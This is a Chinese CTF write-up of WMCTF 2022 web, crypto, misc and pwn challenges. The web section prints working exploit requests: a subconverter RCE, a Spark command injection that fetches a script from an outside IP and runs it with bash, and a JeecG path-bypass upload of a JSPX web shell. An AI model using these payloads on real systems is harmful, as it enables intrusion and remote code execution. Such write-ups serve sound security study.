# 2022 WMCTF-wp

> 原文: https://www.ctfiot.com/53857.html
> ID: 53857

点击蓝字 ·  关注我们

01

Web

1

subconverter

获取token，convert可以直接读当前⽬录下⽂件

GET /convert?url=pref.toml HTTP/1.1Host: 825bea31-5b59-4019-8696-d7cb2169156b.wmctf2022.wm-team.cn:
81User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28927

commit：https://github.com/tindy2013/subconverter/commit/ce8d2bd0f13f05fcbd2ed90755d097f402393d d3

https://bellard.org/quickjs/quickjs.html#std-module std

std.popen('/readflag > /app/flag1;/app/readflag > /app/flag2', 'r')

GET /sub?target=quanx&url=http://120.26.59.137:81/ HTTP/1.1Host: 825bea31-5b59-4019-8696-d7cb2169156b.wmctf2022.wm-team.cn:
81User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1

将保存的⽂件名格式(url参数的md5)作为script脚本名称 再带上token 填上target发送即可rce。

GET /sub?url=script:
cache/6ae41b39b6a858120a335aac90a2b032&token=P9MYKSRXgLhNe&target=quanxHTTP/1.1Host: 825bea31-5b59-4019-8696-d7cb2169156b.wmctf2022.wm-team.cn:
81User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1

2

Java

from cgitb import textimport requestssession = requests.session()for i in range(2,255):
print(f"[*] {i}")burp0_url = "http://1.13.254.132:
8080/file"burp0_cookies = {"JSESSIONID": "B3083DFA6A4C8F14308E988475819C3E"}burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-formurlencoded", "Origin": "http://1.13.254.132:
8080", "Connection": "close", "Referer":"http://1.13.254.132:
8080/", "Upgrade-Insecure-Requests": "1", "X-Forwarded-For":"127.0.0.1", "X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1", "X-RemoteAddr": "127.0.0.1"}burp0_data = {"url": f"http://10.244.0.{i}:
8080", "Vcode": "skpz"}try:s = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies,data=burp0_data,timeout=0.5)if s.status_code == 200 and "spark://" in s.text:
print(f"[!]{i}{s.text}")
except:
pass

spark命令注⼊ 反弹shell

POST /file HTTP/1.1Host: 1.13.254.132:
8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.88 Safari/537.36Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 126Origin: http://1.13.254.132:
8080Connection: closeReferer: http://1.13.254.132:
8080/Cookie: JSESSIONID=B3083DFA6A4C8F14308E988475819C3EUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1url=http://10.244.0.152:
8080/?doAs=%253Bcurl%2Bhttp%253A%252F%252F120.26.59.137:
8888/>/tmp/1&Vcode=skpz

POST /file HTTP/1.1Host: 1.13.254.132:
8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.88 Safari/537.36Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 64Origin: http://1.13.254.132:
8080Connection: closeReferer: http://1.13.254.132:
8080/Cookie: JSESSIONID=B3083DFA6A4C8F14308E988475819C3EUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1url=http://10.244.0.152:
8080/?doAs=%253Bbash%2B/tmp/1&Vcode=skpz

输⼊token 完成getflag

3

nanoScore

http://1.13.18.40:
8888/users可以看到所有注册⽤户

然后解开题⽬的队伍叫W&M ⾥⾯⽤户试了⼀下 Ha1c9on/123456

4

easyjeecg

所以找个能⽂件上传的接⼝ 带上模糊匹配的url即可绕过getshell

POST /toLogin.do/..;/jeecgFormDemoController.do?saveFiles HTTP/1.1Host: d7de1f92-b1a6-4a67-98dd-63c3ae15e65f.wmctf2022.wm-team.cn:
81User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRl8eeewp2oyUjEUQContent-Length: 1353------WebKitFormBoundaryRl8eeewp2oyUjEUQContent-Disposition: form-data; name="name"8a8ab0b246dc81120146dc8181a60055------WebKitFormBoundaryRl8eeewp2oyUjEUQContent-Disposition: form-data; name="documentTitle"1.jspx------WebKitFormBoundaryRl8eeewp2oyUjEUQContent-Disposition: form-data; name="file";filename="1.jspx"Content-Type: image/jpeg<jsp:
root xmlns:
jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml"xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0"><jsp:
directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/><jsp:
directive.page import="java.util.*"/><jsp:
directive.page import="java.io.*"/><jsp:
directive.page import="sun.misc.BASE64Decoder"/><jsp:
scriptlet><![CDATA[ String tmp = pageContext.getRequest().getParameter("str"); if (tmp != null&&!"".equals(tmp)) { try{ String str = new String((new BASE64Decoder()).decodeBuffer(tmp)); Process p = Runtime.getRuntime().exec(tmp); InputStream in = p.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(in,"GBK")); String brs = br.readLine(); while(brs!=null){ out.println(brs+""); brs = br.readLine(); } }catch(Exception ex){ out.println(ex.toString()); } }]]></jsp:
scriptlet></jsp:
root>------WebKitFormBoundaryRl8eeewp2oyUjEUQ--

jsp被nginxban了 jspx执⾏/readflag即可

02

Crypto

1

nanoDiamond – rev

# 思路 先把每个球（B）都猜⼀次

# 然后两两猜，因为只撒两次慌，两两猜的结果只有三种

# 2错，剩下不会撒谎，错的两组四个球分别是什么就可以

# 1错，说明四个对的球没问题。剩下2个单独问两遍 ，对⽐第⼀轮结果判断对错

# 0错，说明还没撒谎，剩下随便问就可以

from pwn import *import string
# import secrets
from hashlib import sha256
from random import randint, shuffle, choiceimport time #解决有时⽆应答p=remote("1.13.154.182",32758)#1.13.154.182:
31973x=p.recv()print(x)x=x.decode('utf-8')ss=x[12:28]s_sha=x[33:97]st='abcdefghijklmnopqrstuvwxyzABCDEFGHIZKLMNOPQRSTUVWXYZ1234567890'for i1 in st: for i2 in st: for i3 in st: for i4 in st: snew=i1+i2+i3+i4+ss if sha256(snew.encode()).hexdigest()==s_sha: a=snew[:4] p.sendline(a.encode()) break

# 思路 先把每个球（B）都猜⼀次

# 然后两两猜，因为只撒两次慌，两两猜的结果只有三种

# 2错，剩下不会撒谎，错的两组四个球分别是什么就可以

# 1错，说明四个对的球没问题。剩下2个单独问两遍 ，对⽐第⼀轮结果判断对错

# 0错，说明还没撒谎，剩下随便问就可以

# 0错 有⼀个是错的或者全是对的 还剩4次 全对

lis_b=['B0','B1','B2','B3','B4','B5']lis=[0,0,0,0,0,0]x=p.recv()print(x)def send(i): time.sleep(0.066) a1=lis_b[i].encode() p.sendline(a1) print(a1) time.sleep(0.1) x1=p.recv()print(x1) time.sleep(0.066) if b'False' in x1: lis[i]=0 else: lis[i]=1 for ROUND_NUM in range(50): print("round_num",ROUND_NUM) times=0 for i in range(6): send(i) times+=1 #以上测试正常 print(lis) jx=[0,0,0] for i in range(0,6,2): time.sleep(0.066) a1=lis_b[i]+" "+"=="+" "+str(lis[i]) a2=lis_b[i+1]+" "+"=="+" "+str(lis[i+1]) a=a1+" and "+a2 p.sendline(a.encode()) times=times+1 print(a) time.sleep(0.1) x1=p.recv() print(x1) time.sleep(0.066) if b'False' in x1: jx[int(i/2)]=0 else: jx[int(i/2)]=1 print(times) print(jx) #以上测试正常 #9轮之后的判断 jieguo=jx[0]+jx[1]+jx[2] print(jieguo) if jieguo==3: #0错 while(times<13): time.sleep(0.066) a1=b'B0' p.sendline(a1) print(a1) time.sleep(0.1) x1=p.recv() print(x1) times=times+1 print(times)elif jieguo==1: #2错 if jx[0]==1: lis_bnew=[2,3,4,5] for i in lis_bnew: send(i) times+=1 elif jx[1]==1: lis_bnew=[0,1,4,5] for i in lis_bnew: send(i) times+=1 else: lis_bnew=[0,1,2,3] for i in lis_bnew: send(i) times+=1 else:#1错 剩余4次确定两个球 再问⼀遍，对⽐第⼀次结果，结果全真：。结果全假，再问为真。⼀真⼀假，问真若真取第⼀轮，若假取第⼆轮 if jx[0]==0: lis_bnew=[0,1] if jx[1]==0: lis_bnew=[2,3] if jx[2]==0: lis_bnew=[4,5] jx3=[] #询问结果 for i in lis_bnew: time.sleep(0.066) a1=lis_b[i].encode() p.sendline(a1) print(a1) time.sleep(0.1) x3=p.recv() if b'False' in x3: jx3.append(0) else: jx3.append(1)
 print(jx3) times=times+1 print("times=",times) print(lis[i-1],lis[i]) if lis[i]==jx3[1] and lis[i-1]==jx3[0]:#和第⼀次对⽐结果全为真 要么第⼆轮撒谎，要么⼀三轮撒谎。再问⼀遍如果结果全不⼀样。说明⼀三轮撒谎。只有⼀个不⼀样则是第⼆轮撒谎 print("lis和jx相等") jx4=[] a1=lis_b[i-1].encode() p.sendline(a1)print(a1) time.sleep(0.1) x4=p.recv() if b'False' in x4: jx4.append(0) else: jx4.append(1) time.sleep(0.066) times=times+1 a1=lis_b[i].encode() p.sendline(a1) print(a1) time.sleep(0.1) x4=p.recv() if b'False' in x4: jx4.append(0) else: jx4.append(1) time.sleep(0.066) times=times+1 if jx3[0]!=jx4[0] and jx3[1]!=jx4[1]: print("三四轮结果不⼀样") lis[i]=jx4[1] lis[i-1]=jx4[0] elif lis[i]!=jx3[1] and lis[i-1]!=jx3[0]: print("lis和jx全不相等") send(i-1) times+=1 send(i) times+=1 else: tu=0 print("lis和部分相等") if lis[i]==jx3[1]: time.sleep(0.066) a1=lis_b[i].encode() p.sendline(a1) print(a1) time.sleep(0.1) times+=1 x1=p.recv() print(x1) if b'False' in x1: tu=0 else: tu=1 if tu!=lis_b[i]:
lis[i-1]=int(lis[i-1])^1 else: time.sleep(0.066) a1=lis_b[i-1].encode() p.sendline(a1) print(a1) time.sleep(0.1) x1=p.recv() times+=1 print(x1) if b'False' in x1: tu=0 else: tu=1 if tu!=lis_b[i-1]: lis[i]=int(lis[i])^1 while(times<13): p.sendline(a1) print(a1) times=times+1 print(times) time.sleep(0.66) x=p.recv() print(x) #输出结果 print(lis) aaa="" for i in lis: aaa+=str(i)+" " aaa=aaa.encode() print(aaa) p.sendline(aaa) time.sleep(0.1) x=p.recv() print(x)

2

ecc

先求p,p既是n的因⼦也是椭圆曲线的模数,再通过两点解⽅程组得到a,b

e = 0x10001n =61262574892917665379101848600282751252633178779864648655116434051615964747592676204833262666589440081296571836666022795166255640192795587508845265816642144669301520989571990670507103278098950563219296310830719975959589061794360407053224254135937766317251283933110936269282950512402428088733821277056712795259c =16002162436420434728223131316901476099110904029045408221515087977802746863468505266500673611412375885221860212238712311981079623398373906773247773552766200431323537510699147642358473715224124662007742017000810447999989426207919068340364725395075614636875116086496704959130761547095168937180751237132642548997G =(3364552845709696244757995625685399274809023621531082895612949981433844727622567352338990765970534554565693355095508508160162961299445890209860508127449468,4874111773041360858453223185020051270111929505293131058858547656851279111764112235653823943997681930204977283843433850957234770591933663960666437259499093)G_3 =(8240596254289477251157504980772167439041663401504657696787046343848644902166655624353107697436635678388969190302189718026343959470011854412337179727187240,4413479999185843948404442728411950785256136111461847698098967018173326770728464491960875264034301169184074110521039566669441716138955932362724194843596479)P.<a>=ZZ[]def add(A,B):x1,y1=Ax2,y2=Bif A==B:l=(3*x1^2+a)/(2*y1)else:l=(y1-y2)/(x1-x2)x3=l^2-x1-x2y3=l*(x1-x3)-y1return (x3,y3)G3=add(add(G,G),G)x,y=G3f=x.numerator()-G_3[0]*x.denominator()g=y.numerator()-G_3[1]*y.denominator()while not g==0:f,g=g,f%gp=GCD(f.numerator(),n)q=n//px1,y1=Gx2,y2=G_3a=((y1^2-y2^2)-(x1^3-x2^3))*inverse_mod(x1-x2,p)%pb=(y1^2-x1^3-a*x1)%pE=EllipticCurve(GF(p),[a,b])g=E(G)d=inverse_mod(e,(p-1)*(q-1))m=pow(c,d,n)print((a,b,m))

解flag

a,b,c=(3629864911627283784723617758993690217446918991113173559686999,988958437986133278846018591274848194060347135958347118693976,1910700325063785326106590899271324158468993875758894973739361)m=a<<(606-a.bit_length())m+=b<<(c.bit_length()+1)m+=cprint('wmctf{%s}'%long_to_bytes(m).decode())

3

nanoDiamond

思路

猜同⼀个球（B） 相同认为此球值，不同猜第三次

逻辑简单有bug，因为存在同⼀个球同时撒谎情况，所以需要多运⾏⼏次脚本才能出结果。

from pwn import *import string
# import secrets
from hashlib import sha256
from random import randint, shuffle, choiceimport time #解决有时⽆应答p=remote("1.13.154.182",30725)x=p.recv()print(x)x=x.decode('utf-8')ss=x[12:28]#print(ss)s_sha=x[33:97]#print(s_sha)st='abcdefghijklmnopqrstuvwxyzABCDEFGHIZKLMNOPQRSTUVWXYZ1234567890'for i1 in st: for i2 in st: for i3 in st: for i4 in st: snew=i1+i2+i3+i4+ss if sha256(snew.encode()).hexdigest()==s_sha: a=snew[:4] p.sendline(a.encode()) breaklis_b=['B0','B1','B2','B3','B4','B5']lis=[0,0,0,0,0,0]x=p.recv()print(x)for ROUND_NUM in range(50): times=0 for i in range(6): time.sleep(0.066) a1=lis_b[i].encode() p.sendline(a1) times+=1 print(a1) time.sleep(0.1) x1=p.recv() print(x1) time.sleep(0.066) # #question # a1=lis_b[i].encode() p.sendline(a1) times+=1 print(a1) time.sleep(0.066) x2=p.recv() print(x2) x=x2 if x1==x2: if b'False' in x1: lis[i]=0 else: lis[i]=1 else: #question if times>=14:#防⽌最后⼀次出错 if b'False' in x1: lis[i]=0 else: lis[i]=1 break a1=lis_b[i].encode() p.sendline(a1) times+=1 print(a1) time.sleep(0.66) x3=p.recv() print(x3) x=x3 if b'False' in x3: lis[i]=0 else: lis[i]=1 print(times) time.sleep(0.2) while(times<14): p.sendline(a1) print(a1) times=times+1 print(times) time.sleep(0.66)x=p.recv() print(x) print(lis) aaa="" for i in lis: aaa+=str(i)+" " aaa=aaa.encode() print(aaa) p.sendline(aaa) time.sleep(0.1) x=p.recv() print(x)

03

Misc

1

1!5!

QUIC+TLS解密 内存找到抓包流量的ssl log,导⼊wireshark即可看到⼀半的flag

CLIENT_HANDSHAKE_TRAFFIC_SECRET1002eec63c7da0d66827ebc83af50e00550704d76420b1d039f9ef2222641dd248f1197d22ef93778c14f15ddbbf9a53df20cf74c9c68b9f3073fa9f405da995SERVER_HANDSHAKE_TRAFFIC_SECRET1002eec63c7da0d66827ebc83af50e00550704d76420b1d039f9ef2222641dd238b4671e9ded337c7066e3830563f4519f3bf4effb13d046c2e62847329f0787CLIENT_TRAFFIC_SECRET_01002eec63c7da0d66827ebc83af50e00550704d76420b1d039f9ef2222641dd2457d3990a971aad9a308ea0af62db5745d99a75e0c484487289f9e760b33a43fSERVER_TRAFFIC_SECRET_01002eec63c7da0d66827ebc83af50e00550704d76420b1d039f9ef2222641dd2dc730355e51308929f66eabb06458080459810bdd6b27de884a1c1fdc5385b1e

_HTTP3_1s_C000L}

WebSocket数据流分析 从内存中找到服务器端处理的代码

import ( "github.com/gin-gonic/gin" "github.com/gorilla/websocket" "net/http")var flags = "WMCTF{WebS0cket_And"var upGrader = websocket.Upgrader{ CheckOrigin: func(r *http.Request) bool { return true },}//发送flagfunc flag(c *gin.Context) { //升级get请求为webSocket协议 ws, err := upGrader.Upgrade(c.Writer, c.Request, nil) if err != nil { return } defer ws.Close() //循环把flags给传输过去 for { //读取ws中的数据 mt, message, err := ws.ReadMessage()if err != nil { break } if string(message) == "flag" { //写⼊ws数据 for i := 0; i < len(flags); i++ { ch := string(flags[i]) err := ws.WriteMessage(mt, []byte(ch)) //sleep⼀秒 //time.Sleep(time.Second) if err != nil { break } } } }}func main() { bindAddress := "localhost:
2303" r := gin.Default() r.GET("/flag", flag) r.Run(bindAddress)}

本地起⼀下服务器端的代码,发现本地浏览器⽆法访问,看流量包,流量包中没有抓到服务器端发送flag的数据流,只有 客户端接收到flag后响应的流,猜测内存中还存在客户端的加密代码通过搜索ws:/ 发现。

function randomString(e) { e = e || 32;var t = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678",a = t.length,n = "";for (i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));
return n}function encrypto( str, xor, hex ) {if ( typeof str !== 'string' || typeof xor !== 'number' || typeof hex !== 'number') {return; }let resultList = [];hex = hex <= 25 ? hex : hex % 25;for ( let i=0; i<str.length; i++ ) {let charCode = str.charCodeAt(i);charCode = (charCode * 1) ^ xor;charCode = charCode.toString(hex);resultList.push(charCode); }let splitStr = String.fromCharCode(hex + 97);let resultStr = resultList.join( splitStr );
return resultStr;}var b1 = new Encode()var ws = new WebSocket("ws://127.0.0.1:
2303/flag"); ws.onopen = function(evt) { console.log("Connection open ..."); ws.send("flag"); }; ws.onmessage = function(evt) { var rstr = randomString(5)n = evt.datares = n.padEnd(9,rstr)s1= encrypto(res,15,25)f1 = b1.encode(s1)ws.send(f1)console.log('Connection Send:'+f1)}; ws.onclose = function(evt) { console.log("Connection closed."); }; function Encode() {_keyStr = "/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC";this.encode = function (input) {var output = "";var chr1, chr2, chr3, enc1, enc2, enc3, enc4;var i = 0;input = _utf8_encode(input);while (i < input.length) {chr1 = input.charCodeAt(i++);chr2 = input.charCodeAt(i++);chr3 = input.charCodeAt(i++);enc1 = chr1 >> 2;enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);enc4 = chr3 & 63;if (isNaN(chr2)) {enc3 = enc4 = 64; } else if (isNaN(chr3)) {enc4 = 64; }output = output +_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +_keyStr.charAt(enc3) + _keyStr.charAt(enc4); }return output; }_utf8_encode = function (string) {string = string.replace(/rn/g,"n");var utftext = "";for (var n = 0; n < string.length; n++) {var c = string.charCodeAt(n);if (c < 128) {utftext += String.fromCharCode(c); } else if((c > 127) && (c < 2048)) {utftext += String.fromCharCode((c >> 6) | 192);utftext += String.fromCharCode((c & 63) | 128); } else {utftext += String.fromCharCode((c >> 12) | 224);utftext += String.fromCharCode(((c >> 6) & 63) | 128);utftext += String.fromCharCode((c & 63) | 128); } }return utftext; }}

让我们去逆这个确实不太真实,找⼀下发现规律前⾯三个字符是唯⼀的

(流量包⾥是WMCTF{ 假的flag也是WMCTF{开头,发现的规律) 最后解⼀下

dicts = {}with open('./out!!','r',encoding='utf-8') as f:
for i in f.readlines():
data = i.split(':')[2].replace('n','')flag1 = data[0:3]flag2 = data[-1]dicts[flag1] = flag2
# print(dicts)flag = ''with open('./flag.txt','r',encoding='utf-8') as f:
for i in f.readlines():
data = i.split(',')[1][0:3]flag += dicts[data]print(flag)#output:
WMCTF{LOL_StR1ngs_1s_F@ke_BUT

最终拼起来flag

WMCTF{LOL_StR1ngs_1s_F@ke_BUT_HTTP3_1s_C000L}

2

签到

WMCTF{Welcode_wmctf_2022!!!!have_fun!!}

3

Plants vs Zombies PVP

⽤CE修改器修改阳光和僵⼫的刷新时间，然后启⽤速度修改改到最⼤，光速刷僵⼫。

然后就可以看到这个钱到位了，直接获取flag。

4

A Secret Of Crazy Dave

Hint: cheat code and crazy dave says 在游戏⼤厅敲pinata

注释信息

5

WMCTF 2022 Questionnaire

6

nano

时间排序

import osfor root, dirs, files, rootfd in os.fwalk('./PaxHeaders.2659874'):
print(root, "consumes", end="")files = [root +'/' + name for name in files]data = dict()count = 0for i in files:
with open(i,'r') as f:
data = f.readlines()print(data)df.loc[count,'filename'] = idf.loc[count,'mtime'] = data[0].split("=")[1].replace('n','')df.loc[count,'atime'] = data[1].split("=")[1].replace('n','')df.loc[count,'ctime'] = data[2].split("=")[1].replace('n','')count += 1print(count)

简单改个偏移即可

import pandas as pddf_new = pd.read_excel('sort_1.xlsx')s = [ './pics/' + i.split('/')[-1] for i in df_new['filename']]for num in range(600,1024-3):a = Image.open(s[num])w,h = a.sizeb = Image.open(s[num+1])d = Image.open(s[num+2])c = Image.new("L",(w,h))for i in range(0,w-2):
for j in range(0,h):ra = a.getpixel((i,j))rb = b.getpixel((i+1,j))rd = d.getpixel((i+2,j))if ra == rb == rd :rc = 255else:rc = 0c.putpixel((i,j),rc) # print(r) # news = img1.getpixel((i,j))c.save("./newnew/" + s[num].split('/')[-1])

04

Pwn

1

ubuntu

init ⽂件权限设置错误

echo “cat flag”>>init&&exit

Tip

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）

有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等）

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
GET /convert?url=pref.toml HTTP/1.1Host: 825bea31-5b59-4019-8696-d7cb2169156b.wmctf2022.wm-team.cn:
81User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28927
commit：https://github.com/tindy2013/subconverter/commit/ce8d2bd0f13f05fcbd2ed90755d097f402393d d3
https://bellard.org/quickjs/quickjs.html#std-module std
std.popen('/readflag > /app/flag1;/app/readflag > /app/flag2', 'r')
GET /sub?target=quanx&url=http://120.26.59.137:81/ HTTP/1.1Host: 825bea31-5b59-4019-8696-d7cb2169156b.wmctf2022.wm-team.cn:
81User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1
GET /sub?url=script:
cache/6ae41b39b6a858120a335aac90a2b032&token=P9MYKSRXgLhNe&target=quanxHTTP/1.1Host: 825bea31-5b59-4019-8696-d7cb2169156b.wmctf2022.wm-team.cn:
81User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1
from cgitb import textimport requestssession = requests.session()for i in range(2,255):
print(f"[*] {i}")burp0_url = "http://1.13.254.132:
8080/file"burp0_cookies = {"JSESSIONID": "B3083DFA6A4C8F14308E988475819C3E"}burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-formurlencoded", "Origin": "http://1.13.254.132:
8080", "Connection": "close", "Referer":"http://1.13.254.132:
8080/", "Upgrade-Insecure-Requests": "1", "X-Forwarded-For":"127.0.0.1", "X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1", "X-RemoteAddr": "127.0.0.1"}burp0_data = {"url": f"http://10.244.0.{i}:
8080", "Vcode": "skpz"}try:s = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies,data=burp0_data,timeout=0.5)if s.status_code == 200 and "spark://" in s.text:
print(f"[!]{i}{s.text}")
except:
pass
POST /file HTTP/1.1Host: 1.13.254.132:
8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.88 Safari/537.36Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 126Origin: http://1.13.254.132:
8080Connection: closeReferer: http://1.13.254.132:
8080/Cookie: JSESSIONID=B3083DFA6A4C8F14308E988475819C3EUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1url=http://10.244.0.152:
8080/?doAs=%253Bcurl%2Bhttp%253A%252F%252F120.26.59.137:
8888/>/tmp/1&Vcode=skpz
POST /file HTTP/1.1Host: 1.13.254.132:
8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.88 Safari/537.36Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 64Origin: http://1.13.254.132:
8080Connection: closeReferer: http://1.13.254.132:
8080/Cookie: JSESSIONID=B3083DFA6A4C8F14308E988475819C3EUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1url=http://10.244.0.152:
8080/?doAs=%253Bbash%2B/tmp/1&Vcode=skpz
POST /toLogin.do/..;/jeecgFormDemoController.do?saveFiles HTTP/1.1Host: d7de1f92-b1a6-4a67-98dd-63c3ae15e65f.wmctf2022.wm-team.cn:
81User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoAccept:
